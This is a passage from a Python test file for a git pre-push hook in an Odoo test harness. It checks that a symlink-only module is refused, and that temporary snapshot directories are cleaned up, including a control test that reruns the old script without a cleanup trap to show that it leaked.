    mod_dir.mkdir(parents=True)
    os.symlink("/etc/hostname", mod_dir / "link")
    tip_sha = _commit_all(project, "reviewed: symlink-only module")

    stub_log = tmp_path / "stub.log"
    vw_log = tmp_path / "vw.log"
    vw_count_file = tmp_path / "vw.count"
    harness = _harness_with_stubs(tmp_path, stub_log, vw_log, vw_count_file)
    fake_docker = _fake_docker_noop(tmp_path)

    env_extra = {
        "ODOO_HARNESS_DIR": str(harness),
        "PATH": f"{fake_docker}:{os.environ.get('PATH', '')}",
        "VW_CALL_LOG": str(vw_log),
        "VW_COUNT_FILE": str(vw_count_file),
        "STUB_LOG": str(stub_log),
    }
    result = _run_prepush(project, lsha=tip_sha, rsha=ZERO, env_extra=env_extra)

    assert result.returncode != 0, result.stdout
    assert "cannot materialize pushed ref" in result.stdout, result.stdout
    leaked = list(harness.glob(".odoo-harness-prepush-snap.*"))
    assert not leaked, f"the unmaterializable-ref path leaked a snapshot dir: {leaked}"


# Non-vacuousness control for DEFECT 3: the OLD (pre-fix) shape of the rc==3
# auto-build branch -- mktemp's `_base_snap`, then ONLY inline `rm -rf` on the
# normal/return paths, NO trap at all -- reproduced literally as a standalone
# script and driven with the same signal-interrupting prepare-base-db.sh stub
# used above, proving the historical (no-trap) shape really did leak.
OLD_AUTOBUILD_NO_TRAP_SH = """#!/usr/bin/env bash
# Pre-fix embedded literal of hooks/pre-push's odoo_validate_one_ref rc==3
# auto-build branch, transplanted for standalone driving: _base_snap's mktemp
# dir carries ZERO trap here -- cleanup is only the inline `rm -rf` below,
# reached solely via ordinary (non-signal) return paths.
set -u
HARNESS="$1"
_base_snap="$(mktemp -d "${HARNESS}/.odoo-harness-prepush-snap.XXXXXX" 2>/dev/null || true)"
if [ -z "$_base_snap" ]; then
  echo "[pre-push] BLOCKED: cannot materialize"
  [ -n "$_base_snap" ] && rm -rf "$_base_snap" 2>/dev/null
  exit 1
fi
if ! "$HARNESS/prepare-base-db.sh"; then
  echo "[pre-push] BLOCKED: base build failed"
  rm -rf "$_base_snap" 2>/dev/null
  exit 1
fi
rm -rf "$_base_snap" 2>/dev/null
exit 0
"""


def test_old_no_trap_autobuild_would_have_leaked_snapshot_on_signal_interrupt(tmp_path):
    harness = tmp_path / "harness_old_notrap"
    harness.mkdir()
    stub_log = tmp_path / "old_stub.log"
    stub_log.write_text("", encoding="utf-8")
    pb = harness / "prepare-base-db.sh"
    pb.write_text(_STUB_PREPARE_BASE_DB_SIGTERM_SH, encoding="utf-8")
    _make_executable(pb)

    old_script = tmp_path / "old_autobuild_no_trap.sh"
    old_script.write_text(OLD_AUTOBUILD_NO_TRAP_SH, encoding="utf-8")
    _make_executable(old_script)

    env = os.environ.copy()
    env["STUB_LOG"] = str(stub_log)

    result = subprocess.run(
        ["bash", str(old_script), str(harness)],
        env=env, text=True, capture_output=True, check=False,
    )

    leaked = list(harness.glob(".odoo-harness-prepush-snap.*"))
    assert leaked, (
        "the embedded pre-fix (no-trap) auto-build shape no longer leaks the "
        "snapshot dir on a signal-interrupted prepare-base-db.sh call -- this "
        f"control is no longer discriminating. stdout:\n{result.stdout}\n"
        f"stderr:\n{result.stderr}"
    )
